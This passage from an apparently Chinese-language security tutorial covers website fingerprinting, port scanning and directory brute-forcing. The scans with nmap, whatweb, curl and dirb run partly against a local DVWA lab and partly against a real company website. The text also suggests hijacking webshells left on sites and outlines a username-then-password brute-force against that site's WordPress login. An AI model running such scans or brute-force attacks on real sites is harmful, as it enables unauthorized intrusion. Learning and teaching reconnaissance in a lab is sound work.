<figcaption aria-hidden="true">image-20220604165921960</figcaption>
</figure>
<p>在Bin目录下面每个CMS的指纹写成一个txt文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\web安全\御剑\御剑+加强字典+批量\Bin&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    目录: D:\web安全\御剑\御剑+加强字典+批量\Bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">40</span>            <span class="number">530</span> aspcms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">41</span>           <span class="number">1136</span> dedecms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">16</span>:<span class="number">22</span>           <span class="number">1378</span> discuz.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">42</span>           <span class="number">2290</span> drupal.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">42</span>           <span class="number">1918</span> dvbbs.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">43</span>           <span class="number">1563</span> ecshop.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">43</span>            <span class="number">595</span> emlog.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">44</span>           <span class="number">1834</span> empirecms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">45</span>            <span class="number">898</span> espcms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">45</span>           <span class="number">1397</span> foosuncms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">45</span>           <span class="number">1109</span> hdwiki.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">46</span>           <span class="number">1772</span> joomla.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">46</span>            <span class="number">692</span> kesioncms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">50</span>           <span class="number">2277</span> kingcms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">51</span>           <span class="number">1018</span> ljcms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">51</span>            <span class="number">786</span> php168.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">52</span>           <span class="number">2468</span> phpcms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">52</span>           <span class="number">2041</span> phpwind.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">52</span>           <span class="number">2003</span> powereasy.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">52</span>           <span class="number">1691</span> qibosoft.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">53</span>           <span class="number">1428</span> siteserver.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">53</span>            <span class="number">795</span> southidc.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">53</span>           <span class="number">1106</span> wordpress.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">53</span>           <span class="number">1107</span> z<span class="literal">-blog</span>.txt</span><br></pre></td></tr></table></figure>
<p>比如<code>wordpress.txt</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#范例：链接------关键字------CMS别称</span></span><br><span class="line"><span class="comment">#范例：连接------正则表达式------匹配关键字------CMS别称</span></span><br><span class="line">/robots.txt------wordpress------WordPress</span><br><span class="line">/license.txt------wordpress------WordPress</span><br><span class="line">/readme.txt------wordpress------WordPress</span><br><span class="line">/<span class="built_in">help</span>.txt------wordpress------WordPress</span><br><span class="line">/readme.html------wordpress------WordPress</span><br><span class="line">/readme.htm------wordpress------WordPress</span><br><span class="line">/wp-admin/css/colors-classic.css------wordpress------WordPress</span><br><span class="line">/wp-admin/js/media-upload.dev.js------wordpress------WordPress</span><br><span class="line">/wp-content/plugins/akismet/akismet.js------wordpress------WordPress</span><br><span class="line">/wp-content/themes/classic/rtl.css------wordpress------WordPress</span><br><span class="line">/wp-content/themes/twentyeleven/readme.txt------wordpress------WordPress</span><br><span class="line">/wp-content/themes/twentyten/style.css------wordpress------WordPress</span><br><span class="line">/wp-includes/css/buttons.css------wordpress------WordPress</span><br><span class="line">/wp-includes/js/scriptaculous/wp-scriptaculous.js------wordpress------WordPress</span><br><span class="line">/wp-includes/js/tinymce/langs/wp-langs-en.js------wordpress------WordPress</span><br><span class="line">/wp-includes/js/tinymce/wp-tinymce.js------wordpress------WordPress</span><br><span class="line">/wp-includes/wlwmanifest.xml------wordpress------WordPress</span><br></pre></td></tr></table></figure>
<p>御剑在运行的时候会遍历每一个CMS的指纹文件的每一行,然后去该网站<code>http://www.sdtxsn.com/</code>找</p>
<p>对<code>/robots.txt------wordpress------WordPress</code>这一行</p>
<p>御剑就会尝试访问<code>http://www.sdtxsn.com/robots.txt</code>然后从里面寻找有没有wordpress字样,如果有则判定为wordpress
CMS</p>
<p>显然这样判断是很武断的,稍微做一点手脚就可以骗过御剑</p>
<p>比如本地的DVWA靶场,在其根目录下robots.txt最后写一行<code>wordpress</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604170813339.png"
alt="image-20220604170813339" />
<figcaption aria-hidden="true">image-20220604170813339</figcaption>
</figure>
<p>保存之后用御剑去查</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604170832582.png"
alt="image-20220604170832582" />
<figcaption aria-hidden="true">image-20220604170832582</figcaption>
</figure>
<p>御剑检查到wordpress.txt的第一行就是<code>robots.txt</code>然后去<code>192.168.3.2/DVWA</code>查该文件,发现有<code>wordpress</code>字样,于是就武断地认为是wordpress建的站.后面的检查也不做了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604170937466.png"
alt="image-20220604170937466" />
<figcaption aria-hidden="true">image-20220604170937466</figcaption>
</figure>
<p>要想让御剑继续检查就把wordpress.txt中关于<code>robots.txt</code>那一行注释掉</p>
<p>随着我们逐步了解更多CMS还有指纹信息,我们也可以拓展御剑的指纹字典或者新添加CMS指纹,增强御剑的功能</p>
<h4 id="whatweb">whatweb</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# whatweb http://www.sdtxsn.com/</span><br><span class="line">http://www.sdtxsn.com/ [200 OK] All-in-one-SEO-Pack[2.3.11.1], Country[CHINA][CN], HTML5, HTTPServer[nginx/1.4.4], IP[121.36.56.23], JQuery[1.12.4,1.8.3], Modernizr[2.7.1.min], PHP[5.4.23], Script[text/javascript], Title[山东泰西水泥有限公 司 |], UncommonHeaders[<span class="built_in">link</span>], WordPress, X-Powered-By[PHP/5.4.23], X-UA-Compatible[IE=edge], nginx[1.4.4]</span><br></pre></td></tr></table></figure>
<p>php版本,cms类型,服务器类型和版本都查到了</p>
<p>查本地的DVWA靶场</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# whatweb http://192.168.3.2/DVWA</span><br><span class="line">http://192.168.3.2/DVWA [301 Moved Permanently] Apache[2.4.39][mod_fcgid/2.3.9a,mod_log_rotate/1.02], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02], IP[192.168.3.2], OpenSSL[1.1.1b], RedirectLocation[http://192.168.3.2/DVWA/], Title[301 Moved Permanently]</span><br><span class="line">http://192.168.3.2/DVWA/ [302 Found] Apache[2.4.39][mod_fcgid/2.3.9a,mod_log_rotate/1.02], Cookies[PHPSESSID,security], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02], HttpOnly[PHPSESSID,security], IP[192.168.3.2], OpenSSL[1.1.1b], PHP[5.6.9], RedirectLocation[login.php], X-Powered-By[PHP/5.6.9]</span><br><span class="line">http://192.168.3.2/DVWA/login.php [302 Found] Apache[2.4.39][mod_fcgid/2.3.9a,mod_log_rotate/1.02], Cookies[PHPSESSID,security], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02], HttpOnly[PHPSESSID,security], IP[192.168.3.2], OpenSSL[1.1.1b], PHP[5.6.9], RedirectLocation[setup.php], X-Powered-By[PHP/5.6.9]</span><br><span class="line">http://192.168.3.2/DVWA/setup.php [200 OK] Apache[2.4.39][mod_fcgid/2.3.9a,mod_log_rotate/1.02], Cookies[PHPSESSID,security], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02], HttpOnly[PHPSESSID,security], IP[192.168.3.2], OpenSSL[1.1.1b], PHP[5.6.9], Script[text/javascript], Title[Setup :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*], X-Powered-By[PHP/5.6.9]</span><br></pre></td></tr></table></figure>
<p>查不到CMS信息,因为这个靶场压根就没有用CMS建站</p>
<p>但是查到了操作系统Win64,服务器中间件Apache,php版本5.6.9等信息</p>
<h3 id="操作系统指纹识别">操作系统指纹识别</h3>
<p>whatweb等工具也有操作系统指纹识别的功能</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604191222243.png"
alt="image-20220604191222243" />
<figcaption aria-hidden="true">image-20220604191222243</figcaption>
</figure>
<h4 id="curl---head-url"><code>curl --head &lt;URL&gt;</code></h4>
<p><code>curl</code>从终端上请求网页</p>
<p><code>--head</code>选项意思是返回数据包头,丢弃数据主体</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# curl --<span class="built_in">head</span> http://www.sdtxsn.com/</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.4.4</span><br><span class="line">Date: Sat, 04 Jun 2022 11:14:07 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.4.23</span><br><span class="line">Link: &lt;http://www.sdtxsn.com/?rest_route=/&gt;; rel=<span class="string">&quot;https://api.w.org/&quot;</span></span><br><span class="line">Link: &lt;http://www.sdtxsn.com/&gt;; rel=shortlink</span><br></pre></td></tr></table></figure>
<p>如果目标使用操作系统是Windows,服务器是IIS中间件则Server这里应该写Microsoft-IIS/6.0(或者7.5等等版本)</p>
<blockquote>
<p>微软的操作系统版本一般是和IIS中间件挂钩的,比如</p>
<p>WinServer2003使用的是IIS6.0</p>
<p>WinServer2008使用的是IIS7.5</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604192537532.png"
alt="image-20220604192537532" />
<figcaption aria-hidden="true">image-20220604192537532</figcaption>
</figure>
<p>win11上的IIS版本更高</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604192805045.png"
alt="image-20220604192805045" />
<figcaption aria-hidden="true">image-20220604192805045</figcaption>
</figure>
</blockquote>
<p>而现在curl的返回值是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server: nginx/1.4.4</span><br></pre></td></tr></table></figure>
<p>表明目标是运行在nginx中间件上的,至于是Windows系统还是Linux系统尚未可知</p>
<p>实际上用浏览器直接访问目标然后用开发者工具也可以观察到数据包头</p>
<h4 id="nmap--o--a"><code>nmap -O -A</code></h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nmap -O -A 192.168.43.44</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 19:28 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE         VERSION</span><br><span class="line">80/tcp  open  http            Apache httpd 2.4.39 ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>b mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span>a mod_log_rotate/<span class="number">1.02</span>)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-<span class="number">8</span>).</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span>.<span class="number">39</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>b mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span>a mod_log_rotate/<span class="number">1.02</span></span><br><span class="line"><span class="number">135</span>/tcp open  msrpc           Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp open  netbios-ssn     Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">445</span>/tcp open  microsoft-ds?</span><br><span class="line"><span class="number">902</span>/tcp open  ssl/vmware-auth VMware Authentication Daemon <span class="number">1.10</span> (Uses VNC, SOAP)</span><br><span class="line"><span class="number">912</span>/tcp open  vmware-auth     VMware Authentication Daemon <span class="number">1.0</span> (Uses VNC, SOAP)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这里多处信息表明目标<code>192.168.43.44</code>是windows操作系统</p>
<h2 id="网站路径扫描">网站路径扫描</h2>
<h3 id="原理">原理:</h3>
<p>原理就是猜测一个网站的目录有什么,尝试去访问该目录,根据返回的状态码确定其存不存在</p>
<p>比如<code>http://www.sdtxsn.com/index.html</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604194452563.png"
alt="image-20220604194452563" />
<figcaption aria-hidden="true">image-20220604194452563</figcaption>
</figure>
<p>404 NotFound的意思就是压根没有这个目录</p>
<p>但是尝试访问<code>http://www.sdtxsn.com/index.php</code></p>
<p>会自动跳转到<code>http://www.sdtxsn.com</code>说明该主页就是<code>index.php</code>,本网站的后端语言就是php</p>
<p>又如猜测会有一个登录用的<code>login.php</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604194700315.png"
alt="image-20220604194700315" />
<figcaption aria-hidden="true">image-20220604194700315</figcaption>
</figure>
<p>尝试访问时得到返回状态码<code>403 Forbidden</code>,说明网站目录里有这个文件,但是没有访问权限</p>
<p>使用自动化的扫站工具,其基于上述原理,使用目录字典疯狂地向服务端发送请求,然后根据http返回状态判断该目录是否存在,是否可以访问</p>
<p>为啥要扫站?</p>
<p>1.有可能有后门文件比如<code>shell.php</code>,其中一句话木马口令有可能很简单比如'cmd',这样就可以骑别人的马子</p>
<p>2.可能有些敏感文件没有妥当设置保护,能够直接访问</p>
<blockquote>
<p>robots.txt</p>
<p>后台</p>
<p>备份文件.bak,.sql,.txt,.zip,.tar,可能含有密码或者源代码</p>
<p>MySQL接口,比如phpMyAdmin</p>
<p>安装页面:建站一开始的安装页面,在建站完毕后及时删除,否则有可能导致重装</p>
<p>上传目录,通常是/upload/这种字样</p>
<p>编辑器漏洞</p>
</blockquote>
<p>3.可能有些文件的访问权限没有设置好,本应该以管理员登录才能访问,却能够通过URL直接访问,即越权漏洞</p>
<h3 id="本地自动化工具">本地自动化工具</h3>
<h4 id="御剑1.5">御剑1.5</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604195203548.png"
alt="image-20220604195203548" />
<figcaption aria-hidden="true">image-20220604195203548</figcaption>
</figure>
<p>这里御剑只是扫描到了稀松了了的东西,貌似御剑不会递归目录,他只会扫描指定到目录的下一层</p>
<h4 id="burpsuite">burpsuite</h4>
<p>在dashboard上new scan,然后输入目标URL地址就可以扫站</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604195619671.png"
alt="image-20220604195619671" />
<figcaption aria-hidden="true">image-20220604195619671</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604195550098.png"
alt="image-20220604195550098" />
<figcaption aria-hidden="true">image-20220604195550098</figcaption>
</figure>
<p>这里扫描到了一个后台登录文件<code>wp-login.php</code>,御剑的字典里就没有这个文件,此时就可以将他添加到御剑的目录字典里了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604195707350.png"
alt="image-20220604195707350" />
<figcaption aria-hidden="true">image-20220604195707350</figcaption>
</figure>
<p>后面就可以尝试暴力破解或者sql注入攻击或者社工等方式登录</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604195936171.png"
alt="image-20220604195936171" />
<figcaption aria-hidden="true">image-20220604195936171</figcaption>
</figure>
<p>用repeater重复发送多次之后仍然没有让输入验证码,可以考虑使用暴力破解攻击了</p>
<p>并且随便输入用户名密码尝试登录,其报告错误为<code>&lt;div id="login_error"&gt;   &lt;strong&gt;错误&lt;/strong&gt;：无效用户名。</code></p>
<p>还挺贴心地说用户名不对,这就可以让密码都是1,用sniper打用户名,直到获取到有效的用户名,再固定该用户名,sniper用密码字典打密码</p>
<p>这样就把复杂度从<span class="math inline">\(m*n\)</span>降到了<span
class="math inline">\(m+n\)</span></p>
<h4 id="wwwscan">wwwscan</h4>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;Usage&gt;:  D:\web安全\twoScan\wwwscan.exe &lt;HostName|Ip&gt; [<span class="type">Options</span>]</span><br><span class="line">&lt;Options&gt;:</span><br><span class="line">          <span class="literal">-p</span> port        : <span class="built_in">set</span> http/https port</span><br><span class="line">          <span class="literal">-m</span> thread      : <span class="built_in">set</span> max thread</span><br><span class="line">          <span class="literal">-t</span> timeout     : tcp timeout <span class="keyword">in</span> seconds</span><br><span class="line">          <span class="literal">-r</span> rootpath    : <span class="built_in">set</span> root path to scan</span><br><span class="line">          <span class="literal">-ssl</span>           : will use ssl</span><br><span class="line">&lt;Example&gt;:</span><br><span class="line">          D:\web安全\twoScan\wwwscan.exe www.target.com <span class="literal">-p</span> <span class="number">8080</span> <span class="literal">-m</span> <span class="number">10</span> <span class="literal">-t</span> <span class="number">16</span></span><br><span class="line">          D:\web安全\twoScan\wwwscan.exe www.target.com <span class="literal">-r</span> <span class="string">&quot;/test/&quot;</span> <span class="literal">-p</span> <span class="number">80</span></span><br><span class="line">          D:\web安全\twoScan\wwwscan.exe www.target.com <span class="literal">-ssl</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>-p指定目标端口</p>
<p>-m指定线程数</p>
<p>-t指定超时</p>
<p>-r指定次级目录,不写则为根目录</p>
</blockquote>
<p>首先使用nmap扫描端口,看看目标的web服务器是不是在80端口开放</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>&gt; nmap www.sdtxsn.com</span><br><span class="line">Starting Nmap <span class="number">7.92</span> ( https://nmap.org ) at <span class="number">2022</span><span class="literal">-06-04</span> <span class="number">20</span>:<span class="number">08</span> 中国标准时间</span><br><span class="line">Nmap scan report <span class="keyword">for</span> www.sdtxsn.com (<span class="number">121.36</span>.<span class="number">56.23</span>)</span><br><span class="line">Host is up (<span class="number">0.046</span>s latency).</span><br><span class="line">rDNS record <span class="keyword">for</span> <span class="number">121.36</span>.<span class="number">56.23</span>: ecs<span class="literal">-121-36-56-23</span>.compute.hwclouds<span class="literal">-dns</span>.com</span><br><span class="line">Not shown: <span class="number">966</span> filtered tcp ports (no<span class="literal">-response</span>), <span class="number">28</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh</span><br><span class="line"><span class="number">80</span>/tcp   open  http</span><br><span class="line"><span class="number">1024</span>/tcp open  kdm</span><br><span class="line"><span class="number">3306</span>/tcp open  mysql</span><br><span class="line"><span class="number">3690</span>/tcp open  svn</span><br><span class="line"><span class="number">8888</span>/tcp open  sun<span class="literal">-answerbook</span></span><br></pre></td></tr></table></figure>
<p>确实如此,然后<code>wwwscan www.sdtxsn.com -p 80 -m 10 -t 4</code></p>
<p>但是结果wwwscan太逊了,啥也没扫到</p>
<h4 id="dirbuster">dirbuster</h4>
<p>linux上的扫站工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb URL &lt;字典&gt;</span><br></pre></td></tr></table></figure>
<p>其字典在<code>/usr/share/dirb/wordlists/</code>下面放着</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/usr/share/dirb/wordlists]</span><br><span class="line">└─# <span class="built_in">ls</span> -l</span><br><span class="line">total 260</span><br><span class="line">-rw-r--r-- 1 root root 184073 Jan 25  2012 big.txt</span><br><span class="line">-rw-r--r-- 1 root root   1292 Jan 27  2012 catala.txt</span><br><span class="line">-rw-r--r-- 1 root root  35849 Nov 17  2014 common.txt</span><br><span class="line">-rw-r--r-- 1 root root   1492 May 23  2012 euskera.txt</span><br><span class="line">-rw-r--r-- 1 root root    142 Dec 29  2005 extensions_common.txt</span><br><span class="line">-rw-r--r-- 1 root root     75 Mar 16  2012 indexes.txt</span><br><span class="line">-rw-r--r-- 1 root root    244 Dec 29  2005 mutations_common.txt</span><br><span class="line">drwxr-xr-x 2 root root   4096 Apr 28 17:15 others</span><br><span class="line">-rw-r--r-- 1 root root   6561 Mar  5  2014 small.txt</span><br><span class="line">-rw-r--r-- 1 root root   3731 Nov 13  2014 spanish.txt</span><br><span class="line">drwxr-xr-x 2 root root   4096 Apr 28 17:15 stress</span><br><span class="line">drwxr-xr-x 2 root root   4096 Apr 28 17:15 vulns</span><br></pre></td></tr></table></figure>
<p>有很多本字典,甚至子文件夹里还有字典,可以把这些字典送给御剑等软件增强其功能</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# dirb http://www.sdtxsn.com/</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Jun  4 20:18:46 2022</span><br><span class="line">URL_BASE: http://www.sdtxsn.com/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://www.sdtxsn.com/ ----</span><br><span class="line">+ http://www.sdtxsn.com/admin.php (CODE:403|SIZE:570)</span><br><span class="line">--&gt; Testing: http://www.sdtxsn.com/alert</span><br></pre></td></tr></table></figure>
<h2 id="网站源码泄漏">网站源码泄漏</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604204704933.png"
alt="image-20220604204704933" />
<figcaption aria-hidden="true">image-20220604204704933</figcaption>
</figure>
<h3 id="git源码泄漏">.git源码泄漏</h3>
<p>这个玩意的原理需要稍微学一下git的使用<a
target="_blank" rel="noopener" href="https://www.runoob.com/git/git-basic-operations.html">Git 基本操作
| 菜鸟教程 (runoob.com)</a></p>
<p>这个锅应该是写CMS的一伙子程序员背</p>
<p>在<code>git init</code>初始化代码库之后会在工作目录下面生成<code>.git</code>隐藏文件</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604205017452.png"
alt="image-20220604205017452" />
